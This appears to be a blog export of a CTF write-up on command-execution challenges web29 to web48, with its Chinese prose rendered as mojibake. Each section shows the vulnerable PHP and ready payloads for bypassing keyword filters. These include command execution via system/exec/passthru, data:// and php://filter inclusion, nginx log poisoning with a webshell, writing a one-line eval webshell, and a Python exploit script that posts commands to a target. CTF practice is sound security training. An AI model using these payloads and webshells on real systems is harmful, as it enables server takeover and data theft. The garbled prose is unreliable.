                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e    public $code=\u0026#39;xrntkk\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e$poc = new ctfshowvip();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eecho urlencode(serialize($poc));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web262\"\u003eweb262\u003c/h4\u003e\n\u003cp\u003eå­—ç¬¦ä¸²é€ƒé€¸\u003c/p\u003e","title":"CTFSHOW-ååºåˆ—åŒ–-Writeup"},{"content":"web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚\nè¿›è¡Œç»•è¿‡å°±è¡Œï¼Œè§£æ³•å¾ˆå¤š\nc=system(\u0026ldquo;cat fl*g.php | grep -E \u0026lsquo;fl.g\u0026rsquo; \u0026ldquo;);\nc=system(\u0026ldquo;tac fl*g.php\u0026rdquo;);\nc=system(\u0026ldquo;cat fl*g.php\u0026rdquo;);ï¼ˆç”¨catè¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°å›æ˜¾ï¼‰\nc=system(\u0026ldquo;cp fl*g.php a.txt \u0026ldquo;);ï¼ˆè®¿é—®a.txtæŸ¥çœ‹ï¼‰\nc=system(\u0026rsquo;echo -e \u0026quot; \u0026lt;?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \u0026quot; \u0026gt; a.php\u0026rsquo;); //ç›´æ¥æ–°å»ºä¸€ä¸ªé¡µé¢å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ ï¼ˆ/a.php?c=system(\u0026ldquo;tac flag.php\u0026rdquo;);ï¼‰\n?c=echo `tac fla*`;\n\u0026hellip;.\nweb30 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­—flagï¼Œsystemè¿˜æœ‰phpï¼Œç”±äºè¿‡æ»¤äº†systemæˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\npayload:\nc=printf(exec(\u0026ldquo;cat%20fl*\u0026rdquo;));\nc=echo exec(\u0026ldquo;cat f\\lag.p\\hp\u0026rdquo;);\nc=show_source(scandir(\u0026rdquo;.\u0026rdquo;)[2]); (è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•é¡¹çš„æ•°ç»„)\nc=highlight_file(next(array_reverse(scandir(\u0026rdquo;.\u0026rdquo;))));\nc=passthru(\u0026ldquo;tac fla*\u0026rdquo;);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(\u0026ldquo;tac fla*\u0026rdquo;);*\nc=echo shell_exec(\u0026ldquo;tac fla*\u0026rdquo;);\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;);\nc=passthru(base64_decode(\u0026ldquo;Y2F0IGZsYWcucGhw==\u0026rdquo;));(base64ç»•è¿‡)\n\u0026hellip;\u0026hellip;\nweb31 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(\u0026ldquo;tac%09fla*\u0026rdquo;); c=echo`tac%09fla*`; web32 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\nè¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨${IFS}å’Œ%0a ä»£æ›¿ï¼Œåˆ†å·å¯ä»¥ç”¨?\u0026gt;ä»£æ›¿\nç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nå¾—åˆ°çš„ç»“æœç”¨base64è§£ç ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†\næˆ–è€…ç”¨æ—¥å¿—æ³¨å…¥ï¼š\nurl/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯\nweb33 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ªåŒå¼•å· /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\u0026quot;\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼šï¼ˆwsmè¿˜èƒ½ç§’ï¼‰\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®å­— /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=|/|[0-9]\nä¸æ˜¯å“¥ä»¬ï¼Œæ•°å­—ä¹Ÿè¦å±è”½ï¼Œé‚£æˆ‘æ”¹ä¸€ä¸‹ä¸å°±å¥½äº†\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} ä¸æ˜¯å“¥ä»¬ï¼Œæ€ä¹ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«\npayloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c.\u0026#34;.php\u0026#34;); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„cåé¢æ‹¼æ¥ä¸€æ®µ.php\næˆ‘ä»¬åªéœ€è¦åœ¨åŠ å…¥\u003c?php ?\u003eé‚£ä¹ˆphpå°±åªä¼šæ‰§è¡Œä¸­é—´çš„ä»£ç ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ\næ•…payloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /[0-9]|~|`|@|#|\\$|%|^|\u0026amp;|*|\\ï¼ˆ|\\ï¼‰|-|=|+|{|[|]|}|:|'|\u0026quot;|,|\u0026lt;|.|\u0026gt;|/|?|\\\\\nè¿™é‡Œè¦ä½¿ç”¨æ— å‚å‘½ä»¤æ‰§è¡Œ\npayloadï¼š\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nå…³äºæ— å‚å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›è§£é‡Š\nweb41 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: ç¾½ 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST[\u0026#39;c\u0026#39;])){ 15 $c = $_POST[\u0026#39;c\u0026#39;]; 16if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ 17 eval(\u0026#34;echo($c);\u0026#34;); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u0026gt; è¿‡æ»¤å†…å®¹ï¼š/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\nè¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚ æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚\nå¤§ä½¬çš„è„šæœ¬\n1\u0026lt;?php 2$myfile = fopen(\u0026#34;rce_or.txt\u0026#34;, \u0026#34;w\u0026#34;); 3$contents=\u0026#34;\u0026#34;; 4for ($i=0; $i \u0026lt; 256; $i++) { 5\tfor ($j=0; $j \u0026lt;256 ; $j++) { 6 7\tif($i\u0026lt;16){ 8\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u0026lt;16){ 14\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = \u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \u0026#34;\u0026#34;; 22 } 23 24\telse{ 25\t$a=\u0026#39;%\u0026#39;.$hex_i; 26\t$b=\u0026#39;%\u0026#39;.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 29\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\u0026#34;php rce_or.php\u0026#34;) #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ 7if(len(argv)!=2): 8 print(\u0026#34;=\u0026#34;*50) 9 print(\u0026#39;USERï¼špython exp.py \u0026lt;url\u0026gt;\u0026#39;) 10 print(\u0026#34;egï¼š python exp.py http://ctf.show/\u0026#34;) 11 print(\u0026#34;=\u0026#34;*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\u0026#34;\u0026#34; 16 s2=\u0026#34;\u0026#34; 17 for i in arg: 18 f=open(\u0026#34;rce_or.txt\u0026#34;,\u0026#34;r\u0026#34;) 19 while True: 20 t=f.readline() 21 if t==\u0026#34;\u0026#34;: 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;|\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 30 return(output) 31 32while True: 33 param=action(input(\u0026#34;\\n[+] your functionï¼š\u0026#34;) )+action(input(\u0026#34;[+] your commandï¼š\u0026#34;)) 34 data={ 35 \u0026#39;c\u0026#39;:urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\u0026#34;\\n[*] result:\\n\u0026#34;+r.text) å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿è¡Œexp.pyå³å¯\nç¾½å¸ˆå‚…nb\næ³¨æ„é“¾æ¥è¦ç”¨httpä¸èƒ½ç”¨https\nweb42 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 18}else{ 19 highlight_file(__FILE__); 20} è¿™é“é¢˜ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸\u0026quot; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026quot;è¿›è¡Œæ‹¼æ¥\n/dev/null 2\u0026gt;\u0026amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾\nå¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸæ‰§è¡Œ\næˆ‘ä»¬å¯ä»¥é€šè¿‡%0aæˆªæ–­çš„æ–¹å¼ç»•è¿‡\ntac fl*%0a\nor\n; //åˆ†å· | //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤ || //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ \u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ \u0026amp;\u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ\nè¿‡æ»¤äº†åˆ†å·å’Œcatï¼Œå¯ä»¥ç”¨||å’Œ\u0026amp;æ¥ä»£æ›¿åˆ†å·ï¼Œtacä»£æ›¿cat\nå¯æ„é€ playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 æ³¨æ„ï¼Œè¿™é‡Œçš„\u0026amp;éœ€è¦urlç¼–ç \nweb43 è¿‡æ»¤äº†catã€ï¼›ï¼Œ\nä¸æ˜¯å¾ˆå½±å“\ntac fl*%0a\ror\rtac flag.php||\r...\r//è®°å¾—è½¬urlç¼–ç  web44 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flag\nå°é—®é¢˜\ntac fl*%0a\ror\rtac f*||\r...\r//è®°å¾—è½¬urlç¼–ç  web45 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flagå’Œç©ºæ ¼\nå¯ä»¥ç”¨%09æˆ–$IFS$9ä»£æ›¿ç©ºæ ¼\ntac%09fl*%0a\ror\rtac%09f*||\ror\recho$IFS`tac$IFS*`%0A\r...\r//è®°å¾—è½¬urlç¼–ç  web46 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: h1xa\r# @Date: 2020-09-05 20:49:30\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-09-05 21:50:19\r# @email: h1xa@ctfer.com\r# @link: https://ctfer.com\r*/\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rif(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){\rsystem($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;);\r}\r}else{\rhighlight_file(__FILE__);\r} è¿‡æ»¤æœ‰ç‚¹å¤šå•Š\n;|cat|flag| |[0-9]|\\$|*\nä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬ä¸Šé¢˜ä½¿ç”¨çš„æ–¹æ³•å¹¶ä¸ä¼šå—åˆ°å½±å“ï¼Œå› ä¸º%09æ˜¯urlç¼–ç ï¼Œä¸ä¼šè¢«å½“æˆæ•°å­—è¿‡æ»¤\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//è®°å¾—è½¬urlç¼–ç  web47 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:59:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤è¿™ä¹ˆå¤šO.oï¼Ÿ\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail\nä½†æ˜¯å¹¸å¥½æˆ‘ç”¨çš„æ˜¯tac\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//è®°å¾—è½¬urlç¼–ç  web48 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 